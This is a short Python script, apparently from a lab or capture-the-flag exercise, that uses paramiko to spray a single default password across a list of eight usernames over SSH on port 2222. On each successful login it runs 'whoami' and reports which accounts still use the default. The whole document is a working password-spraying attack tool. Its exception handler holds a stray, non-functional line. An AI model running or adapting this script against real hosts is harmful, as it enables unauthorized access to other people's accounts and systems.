#!/usr/bin/python3

import paramiko

#parameters
server = '<IP>' #Change 
un = ["elizabeth", "tara", "becky", "randy", "pablo", "bessie", "gerardo", "sabrina"] #Change - List of username
pw = 'CHANGEME' #Change - Password

#ssh
ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for i in un:
	print("Trying username - " + i)
	try:
		ssh.connect(server, username=i, password=pw, port=2222, look_for_keys=False)
		#command
		ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("whoami")
		print(ssh_stdout.read())
		print(f'Username {i} works with the default PW!!')
		ssh.close()

	except:
		paramiko.ssh_exception.AuthenticationException
		print(f'User: {i} - updated their password')
		
		